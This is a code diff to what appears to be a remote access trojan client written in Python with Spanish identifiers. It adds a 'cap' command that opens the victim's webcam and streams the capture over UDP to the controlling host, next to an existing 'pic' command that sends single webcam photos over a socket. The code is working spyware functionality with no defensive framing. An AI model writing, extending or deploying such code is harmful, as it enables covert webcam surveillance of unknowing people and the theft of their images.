@@ -11,6 +11,7 @@ from subprocess import Popen, PIPE
 from zipfile import ZipFile
 from cryptography.fernet import Fernet
 from random import randint
+from udp import UDP
 
 class TCP:
     def __init__(self, host, port):
@@ -250,6 +251,7 @@ class TCP:
         captura = cv2.VideoCapture(camara, cv2.CAP_DSHOW)
 
         leido, frame = captura.read()
+        captura.release()
 
         if leido:
             self.__sock.send("ok".encode())
@@ -258,6 +260,25 @@ class TCP:
             frame = cv2.imencode(".jpg", frame)[1]
             self.enviarDatos(frame)
         
+        else:
+            self.__sock.send(f"error: Camara \"{camara}\" no encontrada".encode())
+
+    def captura(self, cmd):
+        camara = int(re.findall("-c[= ]([0-9. ].*)", cmd)[0])
+        udp = UDP(self.__host, self.__port)
+
+        captura = cv2.VideoCapture(camara, cv2.CAP_DSHOW)
+        leido = captura.read()[0]
+
+        if leido:
+            self.__sock.send("ok".encode())
+            try:
+                udp.conectar()
+                sleep(0.1)
+                udp.captura(camara)
+                udp.close()
+            except:
+                udp.close()
         else:
             self.__sock.send(f"error: Camara \"{camara}\" no encontrada".encode())
 
@@ -568,6 +589,13 @@ class TCP:
                 elif cmd.lower()[:3] == "pic":
                     try:
                         self.pic(cmd)
+
+                    except:
+                        continue
+
+                elif cmd.lower()[:3] == "cap":
+                    try:
+                        self.captura(cmd)
 
                     except:
                         continue
